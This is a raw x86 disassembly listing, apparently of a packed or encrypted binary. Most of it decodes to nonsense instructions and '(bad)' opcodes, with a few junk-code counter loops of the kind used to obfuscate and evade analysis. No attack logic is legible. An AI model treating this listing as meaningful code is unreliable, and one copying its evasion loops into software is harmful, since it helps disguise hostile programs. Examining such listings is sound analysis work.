  4017e6:	push   ebx
  4017e7:	mov    ecx,0xc0a362c6
  4017ec:	xchg   DWORD PTR [edx-0x38d95492],eax
  4017f2:	sub    eax,0x8abc19f6
  4017f7:	xchg   edi,eax
  4017f8:	test   BYTE PTR ds:0x4b3f447c,bl
  4017fe:	xlat   BYTE PTR ds:[ebx]
  4017ff:	inc    esi
  401800:	jmp    0xd163:0xc9d22c49
  401807:	data16 loopne 0x4017f2
  40180a:	jb     0x4017e5
  40180c:	bound  edx,QWORD PTR ds:0x2b7aded9
  401812:	mov    ebp,gs
  401814:	pop    edx
  401815:	shl    DWORD PTR [ebx+0x40],cl
  401818:	xchg   edi,eax
  401819:	ret    0xe7da
  40181c:	or     DWORD PTR [ebx],edx
  40181e:	fs imul bh
  401821:	out    dx,al
  401822:	lds    esp,FWORD PTR [eax]
  401824:	dec    ecx
  401825:	xchg   esi,eax
  401826:	hlt    
  401827:	add    bl,BYTE PTR [eax-0x2a]
  40182a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40182b:	xor    DWORD PTR [edx-0x5deaaa2],edi
  401831:	or     BYTE PTR [ecx-0x39a03a8f],bh
  401837:	jge    0x4017bd
  401839:	or     al,0x68
  40183b:	inc    ebp
  40183c:	loopne 0x40183c
  40183e:	mov    BYTE PTR [ecx-0x32],ch
  401841:	scas   eax,DWORD PTR es:[edi]
  401842:	cmp    BYTE PTR [edx+0x769673d7],dh
  401848:	icebp  
  401849:	nop
  40184a:	push   eax
  40184b:	rol    ah,cl
  40184d:	mov    ch,0xc7
  40184f:	std    
  401850:	sub    BYTE PTR [edi+0x369e21c5],ah
  401856:	push   0x1e3ba86f
  40185b:	add    dh,BYTE PTR [eax]
  40185d:	in     al,dx
  40185e:	jg     0x401868
  401860:	(bad)  
  401861:	call   0x8c36:0xe66a7166
  401868:	adc    dl,BYTE PTR [edi]
  40186a:	or     eax,0x463e8f74
  40186f:	mov    al,0xe1
  401871:	push   0x40c92f78
  401876:	retf   
  401877:	jmp    0x4018d4
  401879:	cmp    eax,0xf2ac6811
  40187e:	es pusha 
  401880:	mov    bl,0x19
  401882:	push   eax
  401883:	mov    ecx,0x9b33bd75
  401888:	cli    
  401889:	cdq    
  40188a:	icebp  
  40188b:	dec    edi
  40188c:	mov    esi,0xffe0d0d7
  401891:	test   ah,al
  401893:	adc    eax,0x2497e45
  401898:	jno    0x401870
  40189a:	mov    ebp,0xab052c26
  40189f:	lods   al,BYTE PTR ds:[esi]
  4018a0:	mov    cl,0x90
  4018a2:	daa    
  4018a3:	and    edx,esi
  4018a5:	adc    DWORD PTR [edx-0x6e135331],0x51
  4018ac:	or     eax,0xe8aecbe3
  4018b1:	arpl   dx,di
  4018b3:	dec    esi
  4018b4:	ror    BYTE PTR ds:0x731cbf5e,0xe1
  4018bb:	dec    eax
  4018bc:	in     eax,dx
  4018bd:	adc    eax,0x2581c703
  4018c2:	aaa    
  4018c3:	cmp    BYTE PTR [ebx+0x0],al
  4018c6:	add    BYTE PTR [eax],al
  4018c8:	add    BYTE PTR [eax],al
  4018ca:	jmp    0x4018dc
  4018cf:	mov    ebx,DWORD PTR ds:0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx+0x30]
  401b2b:	xor    al,0x52
  401b2d:	push   ebx
  401b2e:	pop    esp
  401b2f:	jns    0x401baf
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401b4a
  401b37:	ret    0x5021
  401b3a:	repnz retf 
  401b3c:	nop
  401b3d:	xchg   esp,eax
  401b3e:	iret   
  401b3f:	out    dx,al
  401b40:	mov    bh,0x2f
  401b42:	mov    DWORD PTR [ebp-0x27],edi
  401b45:	mov    dl,0xc9
  401b47:	lea    ebp,[esi]
  401b49:	fimul  WORD PTR [edi]
  401b4b:	test   al,0x5f
  401b4d:	pop    edi
  401b4e:	fbld   TBYTE PTR [ecx-0x5e]
  401b51:	sbb    ecx,DWORD PTR [ebx-0x3e]
  401b54:	outs   dx,WORD PTR ds:[esi]
  401b56:	frstor [ebx]
  401b58:	fcmovb st,st(7)
  401b5a:	loopne 0x401b8d
  401b5c:	jecxz  0x401b19
  401b5e:	fimul  DWORD PTR [ebx+ecx*2+0x4a]
  401b62:	not    BYTE PTR [ecx]
  401b64:	lahf   
  401b65:	mov    cl,0x1c
  401b67:	(bad)  
  401b68:	jle    0x401b98
  401b6a:	or     BYTE PTR [edx],bh
  401b6c:	hlt    
  401b6d:	push   edx
  401b6e:	rol    esi,cl
  401b70:	push   cs
  401b71:	push   cs
  401b72:	aaa    
  401b73:	cmp    ah,BYTE PTR [ebp-0x35924056]
  401b79:	jecxz  0x401b5b
  401b7b:	lea    eax,[ebx-0x60]
  401b7e:	xlat   BYTE PTR ds:[ebx]
  401b7f:	out    0x4a,eax
  401b81:	inc    eax
  401b83:	xor    DWORD PTR [edi+0x796d94af],ebp
  401b89:	in     eax,dx
  401b8a:	lods   eax,DWORD PTR ds:[esi]
  401b8b:	jo     0x401b2c
  401b8d:	fwait
  401b8e:	out    0x1a,al
  401b90:	push   edx
  401b91:	add    dl,al
  401b93:	loope  0x401bc5
  401b95:	prefetch BYTE PTR [esi]
  401b98:	push   cs
  401b99:	(bad)  [edi]
  401b9b:	in     eax,dx
  401b9c:	xchg   edx,eax
  401b9d:	add    eax,0x6c4328a5
  401ba2:	mov    ah,0xe4
  401ba4:	xlat   BYTE PTR ds:[ebx]
  401ba5:	(bad)  
  401ba6:	je     0x401b36
  401ba8:	aas    
  401ba9:	dec    esi
  401baa:	cli    
  401bab:	mov    ds:0x3be74979,eax
  401bb0:	std    
  401bb1:	clc    
  401bb2:	cmp    edx,edi
  401bb4:	lahf   
  401bb5:	push   0xed5eb46d
  401bba:	cmp    eax,0x4b03a291
  401bbf:	xchg   ebp,eax
  401bc0:	call   0xc172:0xb8a6a95d
  401bc7:	pop    es
  401bc8:	retf   0x2e2d
  401bcb:	push   ss
  401bcc:	sub    al,0xce
  401bce:	cli    
  401bcf:	shl    BYTE PTR [edi],cl
  401bd1:	(bad)  
  401bd2:	cli    
  401bd3:	outs   dx,DWORD PTR fs:[esi]
  401bd5:	push   ebp
  401bd6:	test   BYTE PTR [ebx-0x500d65c],dl
  401bdc:	out    0x52,eax
  401bde:	xor    eax,0x921a096d
  401be3:	scas   al,BYTE PTR es:[edi]
  401be4:	inc    ebx
  401be5:	adc    BYTE PTR [esi+0x28b925b7],cl
  401beb:	and    al,0xb6
  401bed:	test   al,0xa5
  401bef:	mov    edi,0xb32750a7
  401bf4:	mov    WORD PTR [edi-0x6b],?
  401bf7:	dec    eax
  401bf8:	xchg   esp,eax
  401bf9:	popf   
  401bfa:	mov    ah,0xc4
  401bfc:	test   BYTE PTR [ebx+ecx*8],0xb
  401c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c01:	jb     0x401c34
  401c03:	div    BYTE PTR [esi-0x44]
  401c06:	add    eax,0x72e0aa54
  401c0b:	iret   
  401c0c:	gs aam 0x5f
  401c0f:	xchg   ecx,eax
  401c10:	mov    ebp,0x9180738b
  401c15:	pop    ds
  401c16:	xlat   BYTE PTR ds:[ebx]
  401c17:	adc    DWORD PTR [ecx],ebx
  401c19:	dec    edi
  401c1a:	(bad)  
  401c1b:	and    BYTE PTR [edi+eiz*2+0x15],dh
  401c1f:	mov    dh,0xf2
  401c21:	sub    ecx,DWORD PTR [ebp-0x7ff84d0d]
  401c27:	jno    0x401bd9
  401c29:	adc    al,0x8c
  401c2b:	cmp    edi,esp
  401c2d:	(bad)  
  401c2f:	jo     0x401c5c
  401c31:	retf   
  401c32:	sar    BYTE PTR [ecx+0x56],cl
  401c35:	aad    0x6b
  401c37:	loope  0x401bc5
  401c39:	daa    
  401c3a:	sar    DWORD PTR [esi],0xfd
  401c3d:	mov    dl,0x10
  401c3f:	stos   BYTE PTR es:[edi],al
  401c40:	jle    0x401cb6
  401c42:	fmulp  st(5),st
  401c44:	imul   eax,DWORD PTR [ebx-0x31],0x29aaf156
  401c4b:	xchg   ecx,eax
  401c4c:	pop    eax
  401c4d:	sub    al,0xed
  401c4f:	div    DWORD PTR [ebp+0x1cdd4226]
  401c55:	and    al,0x69
  401c57:	xchg   esi,eax
  401c58:	out    dx,eax
  401c59:	xchg   DWORD PTR [edx-0x57],ecx
  401c5c:	mov    DWORD PTR [ebx],esi
  401c5e:	aam    0x99
  401c60:	or     ebx,ebp
  401c62:	pop    esi
  401c63:	sar    bh,1
  401c65:	(bad)  
  401c67:	inc    edi
  401c68:	data16 stos BYTE PTR es:[edi],al
  401c6a:	or     bh,BYTE PTR [eax+0x27]
  401c6d:	or     eax,0xe5522bbb
  401c72:	sub    BYTE PTR [eax],0xc3
  401c75:	add    eax,0x1c7fbf50
  401c7a:	jae    0x401c73
  401c7c:	push   ebp
  401c7d:	mov    DWORD PTR [ecx-0x7d],edi
  401c80:	adc    eax,eax
  401c82:	cmp    al,0x4a
  401c84:	movaps xmm2,XMMWORD PTR [esi+ebp*2]
  401c88:	lods   al,BYTE PTR ds:[esi]
  401c89:	in     al,dx
  401c8a:	fcomp  DWORD PTR [edi]
  401c8c:	push   DWORD PTR [edx+ecx*8-0x1c]
  401c90:	cli    
  401c91:	int3   
  401c92:	retf   
  401c93:	in     eax,0xa7
  401c95:	test   al,0x27
  401c97:	or     eax,0xda2d760b
  401c9c:	gs in  al,dx
  401c9e:	add    al,0x7b
  401ca0:	into   
  401ca1:	sub    cl,BYTE PTR [ecx+0x64]
  401ca4:	jae    0x401cf0
  401ca6:	mov    ch,0xd7
  401ca8:	add    ebx,edx
  401caa:	mov    ds:0x98b682ca,al
  401caf:	outs   dx,BYTE PTR ds:[esi]
  401cb0:	test   DWORD PTR [edx-0x73955cc4],ecx
  401cb6:	inc    esp
  401cb7:	out    dx,eax
  401cb8:	inc    eax
  401cb9:	pop    eax
  401cba:	clc    
  401cbb:	mov    al,ds:0xe25eab3f
  401cc0:	call   0xc5c81d78
  401cc5:	jo     0x401c84
  401cc7:	jnp    0x401c79
  401cc9:	icebp  
  401cca:	jo     0x401cd6
  401ccc:	pop    ds
  401ccd:	push   esi
  401cce:	je     0x401ceb
  401cd0:	test   BYTE PTR [ebx-0x6a0cdaca],ah
  401cd6:	push   ebp
  401cd7:	cmp    BYTE PTR [edx*2+0xc146783],dl
  401cde:	mov    ah,0xd4
  401ce0:	lahf   
  401ce1:	leave  
  401ce2:	push   ecx
  401ce3:	addr16 (bad) 
  401ce6:	adc    edx,DWORD PTR [ebx]
  401ce8:	sbb    bl,ch
  401cea:	call   0x2445:0xfb7ceab4
  401cf1:	adc    eax,0xc277f407
  401cf6:	cmp    al,0x6c
  401cf8:	into   
  401cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cfa:	call   0x33769e19
  401cff:	push   ecx
  401d00:	mov    ecx,0x30d7667c
  401d05:	bound  eax,QWORD PTR [edx+ecx*4+0x5d109968]
  401d0c:	loop   0x401cf1
  401d0e:	in     eax,0x89
  401d10:	jnp    0x401cca
  401d12:	fwait
  401d13:	les    esi,FWORD PTR cs:[edx+0x1e41ed0b]
  401d1a:	pop    eax
  401d1b:	(bad)  
  401d1c:	pop    eax
  401d1d:	xor    DWORD PTR [edx+eax*8],esi
  401d20:	pop    ds
  401d21:	sub    bh,dh
  401d23:	(bad)  
  401d24:	sub    cl,dh
  401d26:	fxtract 
  401d28:	mov    ecx,0xcfe1fc72
  401d2d:	mov    esi,0x39af9ed6
  401d32:	pop    esi
  401d33:	xor    edi,edx
  401d35:	pusha  
  401d36:	imul   esp,DWORD PTR [ebx+0x7f],0xeadea82f
  401d3d:	adc    eax,0x7161904
  401d42:	dec    eax
  401d43:	aad    0x39
  401d45:	stos   DWORD PTR es:[edi],eax
  401d46:	lds    edx,FWORD PTR ds:0xb4d7ade
  401d4c:	or     bh,BYTE PTR [ebx]
  401d4e:	cld    
  401d4f:	mov    ecx,0x656c5f00
  401d54:	test   al,0x68
  401d56:	in     eax,0xc3
  401d58:	mov    esp,0x148f971a
  401d5d:	arpl   bp,sp
  401d5f:	nop
  401d60:	push   esi
  401d61:	lahf   
  401d62:	ins    BYTE PTR es:[edi],dx
  401d63:	or     DWORD PTR [ebp+esi*1+0xf],edi
  401d67:	dec    ecx
  401d68:	sbb    al,0xf6
  401d6a:	mov    esp,0xa394a014
  401d6f:	icebp  
  401d70:	(bad)  [edx-0x34d74f55]
  401d76:	sbb    BYTE PTR [eax+0x5f],dh
  401d79:	repz mov edi,0x3fb8e280
  401d7f:	cdq    
  401d80:	mov    ah,0xf5
  401d82:	neg    BYTE PTR ss:[ebx]
  401d85:	gs adc ch,BYTE PTR es:[ebx+0x14]
  401d8a:	push   cs
  401d8b:	ret    
  401d8c:	mov    ah,BYTE PTR [ecx+0x54]
  401d8f:	repnz sbb eax,0xd8547c13
  401d95:	rol    ch,cl
  401d97:	imul   ebp,DWORD PTR [edi],0x57
  401d9a:	jns    0x401dd9
  401d9c:	(bad)  
  401d9d:	loopne 0x401e1d
  401d9f:	pop    ebp
  401da0:	xlat   BYTE PTR ds:[ebx]
  401da1:	sbb    BYTE PTR [edi-0x426447d8],cl
  401da7:	push   ss
  401da8:	or     ch,al
  401daa:	pop    ss
  401dab:	lods   al,BYTE PTR ds:[esi]
  401dac:	mov    dl,0xa2
  401dae:	push   0xfffffffb
  401db0:	xchg   bh,dl
  401db2:	mov    ebx,0x992288ba
  401db7:	lds    ebx,FWORD PTR [edi+0x17]
  401dba:	fst    DWORD PTR [edx]
  401dbc:	xchg   ecx,eax
  401dbd:	xchg   ebx,eax
  401dbe:	push   eax
  401dbf:	mov    dl,0x67
  401dc1:	inc    ebp
  401dc2:	mov    edx,0x1c384be9
  401dc7:	fistp  WORD PTR [ebp-0x6e]
  401dca:	not    DWORD PTR [eax]
  401dcc:	add    DWORD PTR [eax-0x78],edx
  401dcf:	jl     0x401da1
  401dd1:	mov    dl,0x95
  401dd3:	outs   dx,DWORD PTR ds:[esi]
  401dd4:	cmc    
  401dd5:	jne    0x401d9f
  401dd7:	sar    bl,cl
  401dd9:	mov    WORD PTR [ecx],es
  401ddb:	(bad)  
  401ddc:	enter  0xe95a,0x6a
  401de0:	stos   DWORD PTR es:[edi],eax
  401de1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401de2:	dec    edx
  401de3:	jae    0x401e1e
  401de5:	add    al,0x3
  401de7:	jle    0x401dcf
  401de9:	test   ch,bh
  401deb:	mov    bh,0xc0
  401ded:	shl    DWORD PTR [ebp-0xf],cl
  401df0:	(bad)
  401df3:	pop    ecx
  401df4:	mov    DWORD PTR [ecx+0x37],ecx
  401df7:	pop    edi
  401df8:	add    edi,esi
  401dfa:	aad    0x97
  401dfc:	ins    BYTE PTR es:[edi],dx
  401dfd:	cmp    DWORD PTR [eax],esi
  401dff:	sbb    dh,BYTE PTR [esp+ecx*1]
  401e02:	lock cmp ch,BYTE PTR [ecx]
  401e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e06:	sahf   
  401e07:	adc    DWORD PTR [ecx-0x67],ebp
  401e0a:	mov    eax,ds:0xde61c67b
  401e0f:	or     al,0x90
  401e11:	(bad)  
  401e12:	fistp  QWORD PTR [esp+edx*8+0x48]
  401e16:	lahf   
  401e17:	add    DWORD PTR [ebx+0x4bd25ff8],esp
  401e1d:	repnz push 0xf94fdb57
  401e23:	push   ebp
  401e24:	pop    esi
  401e25:	ins    DWORD PTR es:[edi],dx
  401e26:	je     0x401de9
  401e28:	sub    DWORD PTR [ecx-0x66],ecx
  401e2b:	xchg   esp,eax
  401e2c:	mov    bh,BYTE PTR [esi-0x43]
  401e2f:	cmc    
  401e30:	or     ebx,ebp
  401e32:	outs   dx,DWORD PTR ds:[esi]
  401e33:	psraw  mm0,QWORD PTR [edi+0x34338c39]
  401e3a:	aam    0xb9
  401e3c:	and    DWORD PTR [ebp+0x425b976],esi
  401e42:	mov    dl,0xfd
  401e44:	std    
  401e45:	or     al,BYTE PTR [ebp+0x30]
  401e48:	lods   al,BYTE PTR ds:[esi]
  401e49:	int3   
  401e4a:	xor    edi,DWORD PTR [ebx+0x16]
  401e4d:	out    dx,eax
  401e4e:	popa   
  401e4f:	fld    DWORD PTR [esi-0x18]
  401e52:	bnd jmp 0x401e71
  401e55:	call   0xb855:0x9beaabe
  401e5c:	and    al,0xf0
  401e5e:	mov    ebx,edx
  401e60:	dec    esi
  401e61:	xor    al,0xeb
  401e63:	jmp    0xe30e:0x8e7eb533
  401e6a:	mov    dh,0xe0
  401e6c:	cmp    al,0x33
  401e6e:	xlat   BYTE PTR ds:[ebx]
  401e6f:	sub    ch,ah
  401e71:	xchg   BYTE PTR [ecx+0x7549ceba],dl
  401e77:	loop   0x401e55
  401e79:	jo     0x401ef5
  401e7b:	lea    ebp,[ebx+0x3b]
  401e7e:	ja     0x401e51
  401e80:	and    eax,0xac3f5276
  401e85:	pop    ebx
  401e86:	int    0x6f
  401e88:	aam    0xc8
  401e8a:	jge    0x401ec1
  401e8c:	push   edx
  401e8d:	dec    esp
  401e8e:	cli    
  401e8f:	pop    ss
  401e90:	out    0xef,al
  401e92:	xor    ebx,DWORD PTR ds:0x70ad5820
  401e98:	xor    BYTE PTR [edx+0x52],dl
  401e9b:	jge    0x401e37
  401e9d:	push   ss
  401e9e:	adc    ecx,edi
  401ea0:	dec    eax
  401ea1:	jg     0x401f0a
  401ea3:	dec    eax
  401ea4:	adc    BYTE PTR [ebx-0x664eb45b],ah
  401eaa:	and    cl,BYTE PTR [eax]
  401eac:	sahf   
  401ead:	(bad)  
  401eaf:	push   ebp
  401eb0:	rol    BYTE PTR [edi+0x1ddc508c],cl
  401eb6:	pop    es
  401eb7:	in     eax,dx
  401eb8:	mov    al,0x2
  401eba:	pop    ds
  401ebb:	xchg   ecx,eax
  401ebc:	cmc    
  401ebd:	dec    ebx
  401ebe:	sbb    eax,0x70ce3c70
  401ec3:	fs stos BYTE PTR es:[edi],al
  401ec5:	and    DWORD PTR [eax-0x57],0x151e97d1
  401ecc:	gs dec ecx
  401ece:	sub    eax,0xbeded2e7
  401ed3:	das    
  401ed4:	sub    eax,0xe8ee2834
  401ed9:	lods   eax,DWORD PTR ds:[esi]
  401eda:	mov    ds:0x4dda4ff8,eax
  401edf:	test   DWORD PTR [ecx-0x4c4d6e4c],eax
  401ee5:	push   es
  401ee6:	fdiv   DWORD PTR [edx-0x5eecc729]
  401eec:	fcom   QWORD PTR [esp+eiz*8+0x2b3bab78]
  401ef3:	shr    DWORD PTR [edx+0x4f],cl
  401ef6:	sbb    ebx,esp
  401ef8:	lahf   
  401ef9:	jmp    0x401e8f
  401efb:	(bad)  
  401efc:	shl    bh,0xa
  401eff:	dec    eax
  401f00:	and    DWORD PTR [ebx+ebp*8+0x35455186],esp
  401f07:	and    BYTE PTR [ecx-0x4d],ch
  401f0a:	addr16 jge 0x401f3b
  401f0d:	cmp    eax,0xe1a0df53
  401f12:	cwde   
  401f13:	or     eax,0x2133b6b3
  401f18:	sub    al,0x1b
  401f1a:	ja     0x401f20
  401f1c:	mov    edx,?
  401f1e:	daa    
  401f1f:	pushf  
  401f20:	push   cs
  401f21:	xor    BYTE PTR [edx],cl
  401f23:	or     BYTE PTR [edx-0x38fc6148],cl
  401f29:	mov    ebx,DWORD PTR ds:0x43380b
  401f2f:	mov    ecx,DWORD PTR ds:0x433857
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	jno    0x401f0c
  401f5e:	jmp    0x401fd2
  401f60:	dec    ebp
  401f61:	add    eax,0x7d6f7e7e
  401f66:	jle    0x401fe6
  401f68:	dec    esi
  401f69:	lds    eax,FWORD PTR [edi]
  401f6b:	fsubr  DWORD PTR [esi]
  401f6d:	adc    DWORD PTR [ebp+eax*1-0x346911b0],eax
  401f74:	push   edx
  401f75:	pop    ds
  401f76:	adc    cl,BYTE PTR [edx+0x1b]
  401f79:	mov    cl,0x8a
  401f7b:	sub    al,0x5
  401f7d:	push   ebp
  401f7e:	cmp    esp,DWORD PTR [esi-0x96fd46c]
  401f84:	outs   dx,DWORD PTR ds:[esi]
  401f85:	push   0x12
  401f87:	or     al,0xe5
  401f89:	sub    al,0xe6
  401f8b:	das    
  401f8c:	mov    bh,0x1
  401f8e:	leave  
  401f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f90:	add    al,0x57
  401f92:	idiv   BYTE PTR [eax+0x54f978b1]
  401f98:	xor    ch,BYTE PTR [esi+ecx*1]
  401f9b:	push   edx
  401f9c:	out    dx,eax
  401f9d:	sbb    BYTE PTR [esi+edi*1],cl
  401fa0:	call   0x60b40013
  401fa5:	cld    
  401fa6:	mov    ch,0x30
  401fa8:	jmp    DWORD PTR [ebp+0x2fc4d063]
  401fae:	adc    eax,0x982e2f46
  401fb3:	in     eax,0xb4
  401fb5:	fsubr  st(1),st
  401fb7:	pop    ecx
  401fb8:	in     eax,dx
  401fb9:	add    eax,edi
  401fbb:	jle    0x401fa4
  401fbd:	cmp    DWORD PTR [eax+0x4a],ebx
  401fc0:	push   ebx
  401fc1:	ins    DWORD PTR es:[edi],dx
  401fc2:	add    DWORD PTR [ebp-0x17],ecx
  401fc5:	push   0x3e
  401fc7:	push   ds
  401fc8:	cmp    edi,DWORD PTR [edi-0x1e0b17a0]
  401fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fcf:	mov    ebp,DWORD PTR [ebp-0x4b72bdc5]
  401fd5:	ja     0x401fd7
  401fd7:	xchg   edi,eax
  401fd8:	jmp    0x401fbc
  401fda:	push   edx
  401fdb:	adc    ecx,DWORD PTR [ebp+0x17]
  401fde:	add    eax,0x737b5c1
  401fe3:	jbe    0x401f6b
  401fe5:	jmp    0x2f21f193
  401fea:	pop    ebp
  401feb:	sbb    ebx,DWORD PTR [edi]
  401fed:	push   0xffffff80
  401fef:	push   ebp
  401ff0:	inc    edx
  401ff1:	xchg   esp,eax
  401ff2:	push   edi
  401ff3:	xor    BYTE PTR [edx+0x50889313],dh
  401ff9:	call   0x7f8a:0xfaba62e8
  402000:	vpshlq ymm15,[eax+0x4f],xmm0
  402006:	and    al,0x18
  402008:	cmp    BYTE PTR [edi+0x6d011f5b],dh
  40200e:	mov    si,0xa40b
  402012:	xor    al,0x1a
  402014:	push   ecx
  402015:	adc    BYTE PTR [ebx],0x21
  402018:	push   0xaf3e5446
  40201d:	call   FWORD PTR [edi]
  40201f:	sub    eax,DWORD PTR [ecx]
  402021:	pop    esi
  402022:	inc    eax
  402023:	les    eax,FWORD PTR [edx-0x14]
  402026:	mov    dl,0x2c
  402028:	cmp    al,0x1f
  40202a:	dec    DWORD PTR [esi+0x7c]
  40202d:	arpl   WORD PTR [eax+0x73d4adb],dx
  402033:	int    0x57
  402035:	or     edx,0x890c23f4
  40203b:	sub    eax,DWORD PTR [edx]
  40203d:	pop    edx
  40203e:	imul   eax,DWORD PTR [edi+edi*8-0x4f],0xffffffcb
  402043:	sbb    BYTE PTR [ebx-0x36],dl
  402046:	xlat   BYTE PTR ds:[ebx]
  402047:	leave  
  402048:	lock imul esi,DWORD PTR [eax+0x1c],0xfffffff1
  40204d:	adc    eax,0xea82f71b
  402052:	adc    dh,BYTE PTR [ebx]
  402054:	mov    eax,ds:0x1c1290b1
  402059:	in     al,dx
  40205a:	push   ds
  40205b:	test   eax,0xa5bf979e
  402060:	cdq    
  402061:	inc    esp
  402062:	out    0xb4,al
  402064:	cmp    BYTE PTR [eax],bh
  402066:	mov    al,0x2
  402068:	mov    bl,0x36
  40206a:	jl     0x4020d0
  40206c:	ret    0x3fdc
  40206f:	(bad)  
  402070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402071:	cld    
  402072:	mov    ds:0x91dda726,al
  402077:	outs   dx,DWORD PTR ds:[esi]
  402078:	dec    esi
  402079:	adc    eax,0x2087118a
  40207e:	push   ebx
  40207f:	pop    eax
  402080:	jg     0x4020b5
  402082:	out    0x36,eax
